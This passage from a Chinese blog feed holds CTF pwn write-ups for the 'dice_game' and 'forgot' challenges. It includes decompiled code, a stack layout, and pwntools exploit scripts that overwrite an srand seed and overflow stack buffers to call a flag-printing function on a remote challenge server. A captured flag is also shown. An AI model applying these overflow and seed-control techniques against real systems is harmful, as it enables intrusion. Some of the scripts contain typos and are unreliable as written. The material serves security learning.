class="line">    &#123;</span><br><span class="line">      sub_B28((__int64)buf);<span class="comment">//这里其实在服务端获得flag了</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="我们再去看看关键的sub-A20-函数"><a href="#我们再去看看关键的sub-A20-函数" class="headerlink" title="我们再去看看关键的sub_A20()函数"></a>我们再去看看关键的sub_A20()函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_A20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);                    <span class="comment">// 交互2      v1我们输入的一字节整数</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )                             <span class="comment">// 有后面逻辑向前推， v1==v2   即可达到pwn的目的</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>到这里其实看的就很明白了，只需我们50次的每一次输入的整数v1 等等与v2即可，于是我们接下来要做的就是使得v2的值可控！这里我们通过覆盖srand[0]的值为0或者1即可！具体可以在网上再深刻了解下srand与rand函数！</p></blockquote><h3 id="所以我们看下srand-0-以及buff数组在栈上的分布："><a href="#所以我们看下srand-0-以及buff数组在栈上的分布：" class="headerlink" title="所以我们看下srand[0]以及buff数组在栈上的分布："></a>所以我们看下srand[0]以及buff数组在栈上的分布：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">D/A/*</span>   <span class="string">:</span> <span class="string">change</span> <span class="string">type</span> <span class="string">(data/ascii/array)</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">N       :</span> <span class="string">rename</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">U       :</span> <span class="string">undefine</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Use</span> <span class="string">data</span> <span class="string">definition</span> <span class="string">commands</span> <span class="string">to</span> <span class="string">create</span> <span class="string">local</span> <span class="string">variables</span> <span class="string">and</span> <span class="string">function</span> <span class="string">arguments.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="string">Two</span> <span class="string">special</span> <span class="string">fields</span> <span class="string">" r"</span> <span class="string">and</span> <span class="string">" s"</span> <span class="string">represent</span> <span class="string">return</span> <span class="string">address</span> <span class="string">and</span> <span class="string">saved</span> <span class="string">registers.</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span> <span class="attr">Frame size:</span> <span class="number">50</span><span class="string">;</span> <span class="attr">Saved regs:</span> <span class="number">8</span><span class="string">;</span> <span class="attr">Purge:</span> <span class="number">0</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">;</span></span><br><span class="line"><span class="number">-0000000000000050</span></span><br><span class="line"><span class="number">-0000000000000050</span> <span class="string">buf</span>             <span class="string">db</span> <span class="number">55</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="number">-0000000000000019</span> <span class="string">var_19</span>          <span class="string">db</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000018</span> <span class="string">var_18</span>          <span class="string">dq</span> <span class="string">?</span></span><br><span class="line"><span class="number">-0000000000000010</span> <span class="string">seed</span>            <span class="string">dd</span> <span class="number">2</span> <span class="string">dup(?)</span>   <span class="string">//这里的seed</span> <span class="string">为srand的种子，我们将它覆盖为0或者1</span></span><br><span class="line"><span class="number">-0000000000000008</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000007</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000006</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000005</span>                 <span class="string">db</span> <span class="string">?</span> <span class="string">;</span> <span class="string">undefined</span></span><br><span class="line"><span class="number">-0000000000000004</span> <span class="string">var_4</span>           <span class="string">dd</span> <span class="string">?</span></span><br><span class="line"><span class="string">+0000000000000000</span>  <span class="string">s</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000008</span>  <span class="string">r</span>              <span class="string">db</span> <span class="number">8</span> <span class="string">dup(?)</span></span><br><span class="line"><span class="string">+0000000000000010</span></span><br><span class="line"><span class="string">+0000000000000010</span> <span class="string">;</span> <span class="string">end</span> <span class="string">of</span> <span class="string">stack</span> <span class="string">variables</span></span><br></pre></td></tr></table></figure><blockquote><p>所以，我们的思路就是<br>通过覆盖掉seed[0],将伪随机产生的是个唯一确定的值，然后通过Python与C的混合编程实现以下脚本</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="keyword">from</span> ctypes import *</span><br><span class="line">content.<span class="attribute">log_level</span>=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#conn=process('./dice_game')</span></span><br><span class="line"><span class="attribute">conn</span>=remote('111.198.29.45","47215')</span><br><span class="line"></span><br><span class="line"><span class="attribute">libc</span>=cdll.LoadLibrary("./libc.so.6")#混合编程的关键步</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x40+p64(0)</span><br><span class="line"><span class="comment">#payload='a'*0x40+p64(1)</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'Welcome, let me know your name: '</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50):</span><br><span class="line">    <span class="attribute">n</span>=libc.rand(0)%6+1#混合编程的关键步</span><br><span class="line">    #<span class="attribute">n</span>=libc.rand(1)%6+1</span><br><span class="line">    conn.sendlineafter(n)</span><br><span class="line">conn.interacter()</span><br></pre></td></tr></table></figure><h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><h3 id="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"><a href="#这个程序有两个漏洞，利用任意一个可以达到pwn的目的！" class="headerlink" title="这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"></a>这个程序有两个漏洞，利用任意一个可以达到pwn的目的！</h3><blockquote><p>首先还是那一套流程：<br>checsec forgot<br><img src="https://s2.ax1x.com/2019/11/03/KXtB90.png" alt="KXtB90.png"><br>简单运行下了解下程序是怎样运行的<br><img src="https://s2.ax1x.com/2019/11/03/KXtwhq.png" alt="KXtwhq.png"><br>拖入ida查看危险函数以及关键符号<img src="https://s2.ax1x.com/2019/11/03/KXtD3V.png" alt="KXtD3V.png"><br>发现可以程序中有可以直接获取flag的文件，加下那个函数地址<img src="https://s2.ax1x.com/2019/11/03/KXtrcT.png" alt="KXtrcT.png"></p></blockquote><h3 id="ida分析下："><a href="#ida分析下：" class="headerlink" title="ida分析下："></a>ida分析下：</h3><blockquote><p>其实这道题没怎么去关心它到底是干嘛的，目的是pwn掉它，攻击就好了！</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] 注意下这里</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]          与这里</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);                         <span class="comment">// 漏洞点   1</span></span><br><span class="line">  sub_80485DD((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);                     <span class="comment">// 漏洞点    2</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="先看下-isoc99-scanf这个漏洞！查看它的汇编代码"><a href="#先看下-isoc99-scanf这个漏洞！查看它的汇编代码" class="headerlink" title="先看下__isoc99_scanf这个漏洞！查看它的汇编代码"></a>先看下__isoc99_scanf这个漏洞！查看它的汇编代码</h3><p><img src="https://s2.ax1x.com/2019/11/03/KXtsjU.png" alt="KXtsjU.png"><br>我们可以通过溢出数组v232字节大小，将上卖弄我们找到的system函数起始地址覆盖掉返回地址！<br>于是开始攻击：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x080486CC</span></span><br><span class="line">#conn.recv()</span><br><span class="line">#conn.sendline(<span class="string">"yang"</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"yang"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">32</span>+<span class="string">"b"</span>*<span class="number">4</span>+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)#这样就跑不出来了    不是清楚为何原因</span><br><span class="line">conn.interactive()<span class="comment">//cyberpeace&#123;7908ad1e9a7667d0115faa6bdf8c24b1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="再看下这个gets函数漏洞"><a href="#再看下这个gets函数漏洞" class="headerlink" title="再看下这个gets函数漏洞"></a>再看下这个gets函数漏洞</h3><blockquote><p>直接利用gets 函数的漏洞，让sysaddr的地址覆盖了 main()函数push进来来的ebp</p></blockquote><blockquote><p>这里真的是学到的，果然，进步都是刷经验刷出来的！<br>首先找到 gets(s)  //name s在栈中相对与   main()函数push进来来的ebp 的偏移量是多少<br>首先在python 中：</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>)</span><br><span class="line">#于是会给我们自动生成<span class="number">100</span>字节的不重复的字节（<span class="number">4</span>个位单位）</span><br><span class="line"><span class="string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span></span><br></pre></td></tr></table></figure><blockquote><p>然后在gdb ./forgot</p></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">What is your name?</span><br><span class="line"><span class="meta">#它回复我们的</span></span><br><span class="line"><span class="meta">#然后我们输入100字节的不重复字符串（加上单引号  也没关系的）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#Legend: code, data, rodata, value</span></span><br><span class="line"><span class="meta">#Stopped reason: SIGSEGV</span></span><br><span class="line"><span class="meta">#0x61726161 in ?? ()  其实？？其实就是main()函数push进来的ebp所在的地址</span></span><br></pre></td></tr></table></figure><blockquote><p>我们有时不能一眼看出内存数据 0x61726161 对应的是什么，所以写代码嘛##########<br>#下面这个感觉要学习下（刷经验嘛）</p></blockquote><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>=<span class="string">""</span></span><br><span class="line">char_list=[]</span><br><span class="line"><span class="built_in">char</span>=<span class="string">"61726161"</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,len(<span class="built_in">char</span>),<span class="number">2</span>):</span><br><span class="line">    char_list.<span class="built_in">append</span>(<span class="built_in">char</span>[i:i+<span class="number">2</span>])</span><br><span class="line">char_list.<span class="built_in">reverse</span>()</span><br><span class="line"><span class="built_in">print</span>(char_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in char_list:</span><br><span class="line">    <span class="built_in">text</span>+=chr(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXt6uF.png" alt="KXt6uF.png"></p><blockquote><p>我们再次进入python中;<br><img src="https://s2.ax1x.com/2019/11/03/KXtcB4.png" alt="KXtcB4.png"><br>因为  -4  是因为  67到63 是用来填充返回地址 （这里即是sysaddr）的</p></blockquote><h3 id="于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来"><a href="#于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来" class="headerlink" title="于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来"></a>于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">63</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXtRE9.png" alt="KXtRE9.png"></p><blockquote><p>而参考网上的却可以   ？？？很懵！</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote('<span class="number">111.198</span><span class="number">.29</span><span class="number">.45</span>','<span class="number">49142</span>')</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = 'A'*<span class="number">63</span> + p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/03/KXtWNR.png" alt="KXtWNR.png"></p><p><img src="https://s2.ax1x.com/2019/10/12/uXYRN4.png" alt="uXYRN4.png"><br>要舒展啊！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前已经做过了，但为了共享我尽量把他们放到这里上！这边大概涉及到如何python与C混合编程以及测变量在栈上偏移量的一种方法！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头07</title>
    <link href="http://yoursite.com/2019/11/02/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B407/"/>
    <id>http://yoursite.com/2019/11/02/疯狂的木头07/</id>
    <published>2019-11-02T11:27:12.000Z</published>
    <updated>2019-11-02T14:40:10.321Z</updated>
    
